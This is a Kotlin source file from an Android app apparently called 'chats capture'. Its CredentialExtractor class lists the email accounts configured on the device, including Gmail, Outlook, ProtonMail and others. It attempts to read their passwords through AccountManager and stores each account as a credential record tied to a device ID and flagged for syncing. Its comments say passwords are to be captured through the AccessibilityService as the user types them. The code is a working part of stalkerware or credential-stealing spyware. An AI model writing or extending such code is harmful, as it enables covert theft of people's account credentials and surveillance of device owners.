package com.chats.capture.utils

import android.accounts.Account
import android.accounts.AccountManager
import android.content.Context
import android.os.Build
import com.chats.capture.CaptureApplication
import com.chats.capture.database.CredentialDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.Credential
import com.chats.capture.models.CredentialType
import timber.log.Timber
import java.util.concurrent.TimeUnit

/**
 * Extracts email accounts configured on the device
 */
class CredentialExtractor(private val context: Context) {
    
    private val accountManager = context.getSystemService(Context.ACCOUNT_SERVICE) as AccountManager
    private val credentialDao: CredentialDao = (context.applicationContext as CaptureApplication).database.credentialDao()
    
    /**
     * Get all email accounts configured on the device
     * Note: Passwords cannot be retrieved directly from AccountManager for security reasons
     * They need to be captured via AccessibilityService when user enters them
     */
    fun getEmailAccounts(): List<EmailAccount> {
        val accounts = mutableListOf<EmailAccount>()
        
        try {
            val allAccounts = accountManager.accounts
            
            for (account in allAccounts) {
                val accountType = account.type.lowercase()
                
                // Check if it's an email account
                if (isEmailAccountType(accountType)) {
                    accounts.add(
                        EmailAccount(
                            email = account.name,
                            accountType = accountType,
                            accountName = account.name
                        )
                    )
                }
            }
            
            Timber.d("Found ${accounts.size} email accounts on device")
        } catch (e: Exception) {
            Timber.e(e, "Error extracting email accounts")
        }
        
        return accounts
    }
    
    private fun isEmailAccountType(accountType: String): Boolean {
        val emailTypes = listOf(
            "com.google", // Gmail
            "com.google.android.gm", // Gmail
            "com.microsoft.office.outlook", // Outlook/Hotmail
            "com.yahoo.mobile.client.android.mail", // Yahoo Mail
            "com.yahoo.mobile.client.android", // Yahoo
            "com.aol.mobile.aolapp", // AOL
            "com.icloud", // iCloud
            "com.protonmail.android", // ProtonMail
            "com.tutanota", // Tutanota
            "com.fastmail.fm", // FastMail
            "com.zoho.mail", // Zoho Mail
            "com.qq.mail", // QQ Mail
            "com.163.mail", // 163 Mail
            "com.sina.mail", // Sina Mail
            "com.sohu.mail", // Sohu Mail
            "com.126.mail", // 126 Mail
            "com.outlook.android", // Outlook
            "com.microsoft.office.outlook.provider", // Outlook
            "com.hotmail", // Hotmail
            "com.live", // Live Mail
            "com.msn", // MSN
            "com.exchange", // Exchange
            "com.activesync", // ActiveSync
            "com.eas", // Exchange ActiveSync
            "com.android.email", // Android Email
            "com.android.exchange", // Exchange
            "com.android.contacts", // Contacts (may contain emails)
        )
        
        return emailTypes.any { accountType.contains(it, ignoreCase = true) } ||
               accountType.contains("mail", ignoreCase = true) ||
               accountType.contains("email", ignoreCase = true) ||
               accountType.contains("account", ignoreCase = true)
    }
    
    /**
     * Try to get account password (may not work due to security restrictions)
     * This is a fallback - passwords should be captured via AccessibilityService
     */
    fun tryGetAccountPassword(account: Account): String? {
        return try {
            // This will likely fail due to security restrictions
            // Passwords should be captured via AccessibilityService instead
            accountManager.getPassword(account)
        } catch (e: Exception) {
            Timber.d("Cannot retrieve password for account ${account.name}: ${e.message}")
            null
        }
    }
    
    /**
     * Sync email accounts to credentials database
     * Creates Credential entries for each email account found on device
     * Passwords will be captured separately via AccessibilityService
     */
    suspend fun syncEmailAccountsToCredentials() {
        try {
            val emailAccounts = getEmailAccounts()
            val deviceRegistrationManager = DeviceRegistrationManager(context)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            emailAccounts.forEach { emailAccount ->
                try {
                    // Check if credential already exists for this email
                    val existing = credentialDao.getCredentialsByEmail(emailAccount.email)
                        .firstOrNull { it.accountType == CredentialType.EMAIL_ACCOUNT }
                    
                    if (existing == null) {
                        // Create new credential entry for email account
                        val credential = Credential(
                            deviceId = deviceId,
                            accountType = CredentialType.EMAIL_ACCOUNT,
                            appPackage = null, // System account, not app-specific
                            appName = emailAccount.accountType,
                            email = emailAccount.email,
                            username = emailAccount.email,
                            password = "", // Password not available from AccountManager
                            domain = extractDomainFromEmail(emailAccount.email),
                            url = null,
                            devicePassword = false,
                            timestamp = System.currentTimeMillis(),
                            synced = false
                        )
                        
                        credentialDao.insertCredential(credential)
                        Timber.d("Email account synced to credentials: ${emailAccount.email}")
                    } else {
                        Timber.v("Email account already exists in credentials: ${emailAccount.email}")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error syncing email account: ${emailAccount.email}")
                }
            }
            
            Timber.d("Synced ${emailAccounts.size} email accounts to credentials")
        } catch (e: Exception) {
            Timber.e(e, "Error syncing email accounts to credentials")
        }
    }
    
    /**
     * Extract domain from email address
     */
    private fun extractDomainFromEmail(email: String): String? {
        return try {
            if (email.contains("@")) {
                email.substringAfter("@")
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }
}

data class EmailAccount(
    val email: String,
    val accountType: String,
    val accountName: String
)
